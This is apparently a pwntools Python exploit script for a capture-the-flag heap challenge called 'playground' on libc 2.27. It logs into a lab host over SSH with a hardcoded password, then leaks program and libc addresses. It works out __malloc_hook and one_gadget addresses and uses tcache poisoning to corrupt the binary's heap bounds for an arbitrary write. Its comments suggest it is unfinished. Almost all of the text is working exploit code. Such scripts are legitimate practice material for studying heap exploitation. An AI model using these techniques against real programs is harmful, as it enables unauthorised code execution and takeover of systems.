from pwn import *
## ./libc-2.27.so --library-path ./ ./playground
## LD_PRELOAD=./libc-2.27.so ./playground
## Notes: this exploit is probably done with a tcache poisoning,please note the libc 2.27

#0x5555555580a0 <max_heap>:	0x000055555555a000	0x0000555555559000
#    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      anon_7ffff7ffe +0x140 possible libc ?
# 0x555555559260 first allocation
# malloc 134505 leaks something


context.terminal = ['tmux', 'splitw', '-h']
host = "acidburn"
ip = "127.0.0.1"

category = "heap"
proc = "playground"
path = "/challenges/"+category+"/"+proc+"/"
#prt = int(input(" insert "+host+"'s port to connect to:"))
prt=3022
#pwd = getpass("insert "+host+"'s password:")
pwd="0607991337"
print("Connecting to "+host+" at "+ip+" to execute syscall")
ssh_p = ssh(host,ip,password=pwd,port= prt)

env_0 = {'LD_PRELOAD' : './challenges/heap/playground/libc-2.27.so'}
#brva 0x11da //main start
#brva 0x127b //first malloc(1)
#brva 0x1349 //malloc_call
#brva 0x139d //free_call
#brva 0x13db //show_call
#brva 0x14a1 //write_call
process = "."+path+proc
gdbc = '''
            set environment LD_PRELOAD ./libc-2.27.so
            start
            brva 0x11da
            brva 0x127b
            brva 0x1349
            brva 0x1349
            brva 0x13db
            brva 0x14a1
            c
            c
            c
       '''
print(sys.argv)
if ( sys.argv[1] == 'gdb') :
    c = gdb.debug( [process], ssh = ssh_p, gdbscript = gdbc )
else:
    c = ssh_p.process(process,env=env_0)


## AUTOMATED FUNCTIONS
def malloc(size,label):
    c.recvuntil(b"> ")
    c.sendline(b"malloc %d" % size)
    c.recvuntil(b"==> ")
    addr = c.recvline(False)
    print("malloc :: "+label+" :: "+str(addr))
    return addr
def free(p):
    c.recvuntil(b"> ")
    c.sendline(b"free %b" % p)
    c.recvuntil(b"ok")
    print("freed :: "+str(p))
    return
def show(p,n):
    contents = []
    c.recvuntil(b"> ")
    print(b'show '+ p + b' '+ b'%d' % n)
    c.sendline(b'show '+ p + b' %d' % n)
    for i in range(n):
        c.recvuntil(b":")
        contents.insert(i,c.recvline(False))
        print(contents[i])
    return contents
def write(p,n,string):
    c.recvuntil(b"> ")
    c.sendline(b'write '+ p + b' %d' %n)
    c.recvuntil(b"==> read")
    c.sendline(string)

    c.recvuntil(b"==> done")
    print("printed :: "+str(string)+" at "+str(p))
    return
def byte_addr_to_hex(byte_addr):
    ascii_addr = byte_addr[2::].decode("ascii")
    hex_addr = int(ascii_addr,16)
    #print("converted ::: "+ ascii_addr+" to : "+str(hex_addr))
    return hex_addr
def int_to_sendable(int_addr):
    sendable = "0000"+hex(int_addr)[2::]
    print(str(type(sendable))+"my sendable is :: "+sendable)
    sendable = bytearray.fromhex(sendable)[::-1]
    print("My sendable is")
    print(sendable)
    return sendable
### ELFs
libc = ELF("./libc-2.27.so")
exe = ELF("./playground_patched")
ld = ELF("./ld-2.27.so")
### Hooks
free_hook = libc.symbols["__free_hook"]
malloc_hook = libc.symbols["__malloc_hook"]
### One Gadget
onegadget = 0x4f2c5
### Pointers
ptr1 = b"0x555555559260"
zero = b"0x555555559000"
### Offsets
vmmap_libc_local = 0x7ffff79e2000 #I will not know the address of the libc on the remote machine
                                  #but I suppose I will still have the same offset from the first
                                  #leak to this address
delta_offset = 0x5f1010 #This offset is calculated by subtracting the first local leak to the
                        #known address of the libc in the local file
max_heap_offset = 0x1040a0
main_offset = 0x1011d9
##PID AND MAIN LEAK
c.recvuntil(b"pid: ")
pid = c.recvline(False)
c.recvuntil(b"main: ")
main = c.recvline(False)

print("pid  ::: "+ str(pid))
print("main ::: "+ str(main))
print("malloc_hook :::"+str(hex(malloc_hook)))
print("free_hook :::"+str(hex(free_hook)))

### Calculate Max Heap
input("Ready to calculate max_heap position")
program_base  = byte_addr_to_hex(main) - main_offset
max_heap_addr = program_base + max_heap_offset
min_heap_addr = max_heap_addr + 8

print("The base of the program is at ::: "+ hex(program_base))
print("The max_heap is found at ::: "+ hex(max_heap_addr))
input("Ready for malloc and libc infoleak")

size = 0x20d91

leak = malloc(size,"leak")
free(leak)
libc_base = byte_addr_to_hex(leak) - delta_offset
malloc_hook_addr = libc_base + malloc_hook
one_gadget_addr = libc_base + onegadget

print("the base of the libc is found at ::: "+hex(libc_base))
print("the malloc_hook is found at ::: "+hex(malloc_hook_addr))

input("Ready to corrupt min_heap and max_heap")
payload = int_to_sendable(max_heap_addr)
a = malloc(128,"a")
free(a)

write(a,9,payload)#I'm allocating the min_heap here!
print("I'm going to allocate the min_heap")
cc = malloc(128,"cc")
arbitrary = malloc(128,"arb")#reached segmentation fault !!
print("Now the min_heap and the max_heap should both be blank!")
show(b"0x5555555580a0",5)

#write(arbitrary,16,payload)
c.interactive()
